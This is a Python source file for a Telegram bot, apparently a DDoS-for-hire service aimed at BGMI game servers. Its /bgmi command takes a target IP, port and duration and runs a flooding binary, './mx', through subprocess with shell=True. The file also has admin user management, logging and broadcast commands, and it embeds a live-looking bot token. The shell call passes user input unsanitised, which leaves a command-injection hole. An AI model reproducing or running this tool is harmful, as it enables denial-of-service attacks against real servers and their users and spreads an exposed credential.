import telebot
import subprocess
import datetime
import os
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Insert your Telegram bot token here
bot = telebot.TeleBot('6992301519:AAHzggvhpE7k1qeMA79JS_hBoUbHGlssYks')

# Admin user IDs
admin_id = {"5894848388", "7282752816", "7990474206", "1786683163"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Random Video URLs
VIDEO_URLS = [
    "https://envs.sh/oQ7.mp4",
    "https://envs.sh/mc2.mp4",
    "https://envs.sh/mcd.mp4",
    "https://envs.sh/vJC.mp4",
    "https://envs.sh/vJ5.mp4",
    "https://envs.sh/vJY.mp4",
    "https://envs.sh/vJz.mp4",
    "https://envs.sh/vJK.mp4",
    "https://envs.sh/vJL.mp4",
    "https://envs.sh/vJZ.mp4",
    "https://envs.sh/vJc.mp4",
    "https://envs.sh/vJj.mp4",
    "https://envs.sh/vJA.mp4",
    "https://envs.sh/vJ_.mp4",
    "https://envs.sh/v9J.mp4",
    "https://envs.sh/NMB.mp4",
    "https://envs.sh/NMW.mp4",
    "https://envs.sh/NMS.mp4",
    "https://envs.sh/v9J.mp4",
    "https://envs.sh/HEF.mp4",
    "https://envs.sh/HEt.mp4",
    "https://envs.sh/HEe.mp4",
    "https://envs.sh/HEi.mp4",
    "https://envs.sh/fzk.mp4",
    "https://envs.sh/fzl.mp4",
    "https://envs.sh/fNm.mp4",
    "https://envs.sh/fNy.mp4",
    "https://envs.sh/mvB.mp4",
    "https://envs.sh/mvp.mp4",
    "https://envs.sh/mcd.mp4",
    "https://envs.sh/mc2.mp4",
    "https://files.catbox.moe/u748y2.mp4",
    "https://files.catbox.moe/edv98k.mp4",
    "https://files.catbox.moe/ulekbe.mp4",
    "https://files.catbox.moe/iqcktd.mp4",
    "https://files.catbox.moe/uonfu6.mp4",
    "https://files.catbox.moe/sot0ne.mp4",
    "https://files.catbox.moe/eg9xin.mp4",
    "https://files.catbox.moe/8wyl3s.mp4",
    "https://files.catbox.moe/fkttbr.mp4",
    "https://files.catbox.moe/hj3b2u.mp4",
    "https://files.catbox.moe/p4j2ui.mp4",
    "https://files.catbox.moe/i0kwlh.mp4",
    "https://files.catbox.moe/dl7zd8.mp4",
    "https://files.catbox.moe/dl7zd8.mp4",
    "https://files.catbox.moe/dl7zd8.mp4",
    "https://files.catbox.moe/zl6f1b.mp4",
    "https://files.catbox.moe/oef20x.mp4",
    "https://files.catbox.moe/j2sg38.mp4"
]

def send_video_with_caption(chat_id, caption):
    """Random video bhejne ka function with proper HTML formatting"""
    video_url = random.choice(VIDEO_URLS)
    bot.send_video(chat_id, video=video_url, caption=caption, parse_mode="HTML")
    
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully "
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully ."
            else:
                response = "User already exists ."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed User"
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = ''' Usage: /remove <userid>'''
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully "
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"Flooding Started : {target}:{port} for {time}\nAttack Running Don't put same ip port\n\nREGARDS - @ShrutiMusicBot✅"
    bot.reply_to(message, response)

    # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command

# ✅ Sirf Inhi Groups Ke Users Authorized Hain
allowed_group_ids = ["-1002182851898", "-1002214579435"]

@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    user_id = str(message.from_user.id)  # ✅ Actual user ID
    group_id = str(message.chat.id)  # ✅ Group ID jisme command diya gaya hai

    # ✅ Check karo ki command sirf allowed groups me run ho
    if group_id not in allowed_group_ids:
        response = "🚫 | <b>ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ɢʀᴏᴜᴘ!</b> | 🚫\n\n⚠️ ᴜsᴇ ᴛʜɪs ɪɴ ᴀᴘᴘʀᴏᴠᴇᴅ ɢʀᴏᴜᴘ ᴏɴʟʏ."
        send_video_with_caption(message.chat.id, response)
        return

    command = message.text.split()
    if len(command) != 4:
        response = "❌ <b>ᴜsᴀɢᴇ ᴇʀʀᴏʀ:</b>\n\n✅ <b>ᴘʟᴇᴀsᴇ ᴜsᴇ:</b>\n<code>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</code>"
        send_video_with_caption(message.chat.id, response)
        return

    target, port, time = command[1], int(command[2]), int(command[3])

    # 🔥 **Attacker Info (Corrected)**
    attacker_name = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name}"

    if time > 300:
        response = "⚠️ | <b>ᴇʀʀᴏʀ:</b> ᴛɪᴍᴇ ɪɴᴛᴇʀᴠᴀʟ ᴍᴜsᴛ ʙᴇ ʟᴇss ᴛʜᴀɴ 300 sᴇᴄᴏɴᴅs. | ⚠️"
        send_video_with_caption(message.chat.id, response)
    else:
        record_command_logs(user_id, '/bgmi', target, port, time)
        log_command(user_id, target, port, time)

        # **🔥 Attack Start Message**
        start_message = f"""
┌───🚀 <b>ғʟᴏᴏᴅɪɴɢ sᴛᴀʀᴛᴇᴅ</b> 🚀───┐  

👤 <b>ᴀᴛᴛᴀᴄᴋᴇʀ:</b> <code>{attacker_name}</code>  
🎯 <b>ᴛᴀʀɢᴇᴛ:</b> <code>{target}</code>  
📍 <b>ᴘᴏʀᴛ:</b> <code>{port}</code>  
⏳ <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <code>{time} sᴇᴄᴏɴᴅs</code>  

🔄 ᴀᴛᴛᴀᴄᴋ ɪs ʀᴜɴɴɪɴɢ, ᴅᴏɴ'ᴛ ʀᴇᴘᴇᴀᴛ ᴛʜᴇ sᴀᴍᴇ ɪᴘ/ᴘᴏʀᴛ.  

🔥 ʀᴇɢᴀʀᴅs - @ShrutiMusicBot✅

<b>└────────────────────────┘</b>
"""
        send_video_with_caption(message.chat.id, start_message)

        # **Attack Execution**
        full_command = f"./mx {target} {port} {time} 1200 900"
        subprocess.run(full_command, shell=True)

        # 🎯 **Attack Finish Message**
        finish_message = f"""
┌───✅ <b>ғʟᴏᴏᴅɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇ</b> ✅───┐  

👤 <b>ᴀᴛᴛᴀᴄᴋᴇʀ:</b> <code>{attacker_name}</code>  
🎯 <b>ᴛᴀʀɢᴇᴛ:</b> <code>{target}</code>  
📍 <b>ᴘᴏʀᴛ:</b> <code>{port}</code>  
⏳ <b>ᴛɪᴍᴇ:</b> <code>{time} sᴇᴄᴏɴᴅs</code>  

⚡ ᴛʜᴇ ᴀᴛᴛᴀᴄᴋ ʜᴀs ғɪɴɪsʜᴇᴅ!  
🔄 ᴜsᴇ /bgmi ᴀɢᴀɪɴ ᴡʜᴇɴ ɴᴇᴇᴅᴇᴅ.  

🔥 ʀᴇɢᴀʀᴅs - @ShrutiMusicBot✅

<b>└────────────────────────┘</b>
"""
        send_video_with_caption(message.chat.id, finish_message)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    response = f"""
┌── 🎯 <b>𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔</b> 🎯 ──┐

🛠 <b>𝐔𝐬𝐞𝐫 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
➥ <b>/bgmi</b> <code>&lt;target&gt; &lt;port&gt; &lt;time&gt;</code> - 𝐒𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤  
➥ <b>/id</b> - 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐔𝐬𝐞𝐫 𝐈𝐃  
➥ <b>/mylogs</b> - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐥𝐨𝐠𝐬  

👑 <b>𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
➥ <b>/add</b> <code>&lt;userID&gt;</code> - 𝐀𝐝𝐝 𝐚 𝐧𝐞𝐰 𝐮𝐬𝐞𝐫  
➥ <b>/remove</b> <code>&lt;userID&gt;</code> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐮𝐬𝐞𝐫  
➥ <b>/broadcast</b> <code>&lt;message&gt;</code> - 𝐒𝐞𝐧𝐝 𝐚 𝐠𝐥𝐨𝐛𝐚𝐥 𝐦𝐞𝐬𝐬𝐚𝐠𝐞  
➥ <b>/clearlogs</b> - 𝐂𝐥𝐞𝐚𝐫 𝐚𝐥𝐥 𝐥𝐨𝐠𝐬  
➥ <b>/logs</b> - 𝐆𝐞𝐭 𝐥𝐨𝐠 𝐟𝐢𝐥𝐞  
➥ <b>/allusers</b> - 𝐂𝐡𝐞𝐜𝐤 𝐚𝐥𝐥 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐮𝐬𝐞𝐫𝐬  

📌 <b>/AllCmd</b> - 𝐆𝐞𝐭 𝐭𝐡𝐞 𝐟𝐮𝐥𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐥𝐢𝐬𝐭  
🔥 𝐑𝐞𝐠𝐚𝐫𝐝𝐬 - @ShrutiMusicBot✅  

└──────────────────────────┘
"""

    send_video_with_caption(message.chat.id, response)


#XXX

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name

    # Inline Button for Joining Channel
    keyboard = InlineKeyboardMarkup()
    join_button = InlineKeyboardButton("📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url="https://t.me/creativeydv")
    keyboard.add(join_button)

    # Video Caption Message with Stylish Font & Bold Text
    caption = f"""
┏━━━━━━━━━━━━━━━━━━━┓
      🚀 <b>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ</b> 🚀
┗━━━━━━━━━━━━━━━━━━━┛

👤 <b>ᴜsᴇʀ:</b> <code>{user_name}</code>  
🛠 <b>ʙᴏᴛ ᴠᴇʀsɪᴏɴ:</b> 𝟏.𝟎  
📆 <b>ᴅᴀᴛᴇ:</b> {datetime.datetime.now().strftime('%d-%m-%Y')}  

🔰 <b>ᴛʜɪs ʙᴏᴛ ᴄᴀɴ:</b>  
  ➥ ᴘᴇʀғᴏʀᴍ ʜɪɢʜ-ʟᴇᴠᴇʟ ғʟᴏᴏᴅɪɴɢ ᴀᴛᴛᴀᴄᴋs  
  ➥ ᴍᴀɴᴀɢᴇ ᴜsᴇʀs ᴀɴᴅ ᴘᴇʀᴍɪssɪᴏɴs  
  ➥ sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇs  

📌 <b>ᴜsᴇ /help ᴛᴏ ᴠɪᴇᴡ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs</b>  
🔥 <b>ʀᴇɢᴀʀᴅs - @ShrutiMusicBot✅</b>
"""

    # Send Video with Caption & Inline Button
    video_url = random.choice(VIDEO_URLS)
    bot.send_video(message.chat.id, video=video_url, caption=caption, parse_mode="HTML", reply_markup=keyboard)

#Dnn

@bot.message_handler(commands=['AllCmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name

    response = f"""
┌── 🎯 <b>𝐀𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒</b> 🎯 ──┐

👤 <b>𝐔𝐬𝐞𝐫:</b> <code>{user_name}</code>

⚡ <b>𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
➥ <b>/add</b> <code>&lt;userID&gt;</code> - 𝐀𝐝𝐝 𝐚 𝐧𝐞𝐰 𝐮𝐬𝐞𝐫  
➥ <b>/remove</b> <code>&lt;userID&gt;</code> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐮𝐬𝐞𝐫  
➥ <b>/broadcast</b> <code>&lt;message&gt;</code> - 𝐒𝐞𝐧𝐝 𝐚 𝐠𝐥𝐨𝐛𝐚𝐥 𝐦𝐞𝐬𝐬𝐚𝐠𝐞  

🛠 <b>𝐎𝐭𝐡𝐞𝐫 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
➥ <b>/bgmi</b> <code>&lt;target&gt; &lt;port&gt; &lt;time&gt;</code> - 𝐒𝐭𝐚𝐫𝐭 𝐚𝐭𝐭𝐚𝐜𝐤  
➥ <b>/clearlogs</b> - 𝐂𝐥𝐞𝐚𝐫 𝐚𝐥𝐥 𝐥𝐨𝐠𝐬  
➥ <b>/logs</b> - 𝐆𝐞𝐭 𝐥𝐨𝐠 𝐟𝐢𝐥𝐞  
➥ <b>/allusers</b> - 𝐂𝐡𝐞𝐜𝐤 𝐚𝐥𝐥 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐮𝐬𝐞𝐫𝐬  
➥ <b>/id</b> - 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐔𝐬𝐞𝐫 𝐈𝐃  

🔥 𝐑𝐞𝐠𝐚𝐫𝐝𝐬 - @ShrutiMusicBot✅  

└──────────────────────────┘
"""

    send_video_with_caption(message.chat.id, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
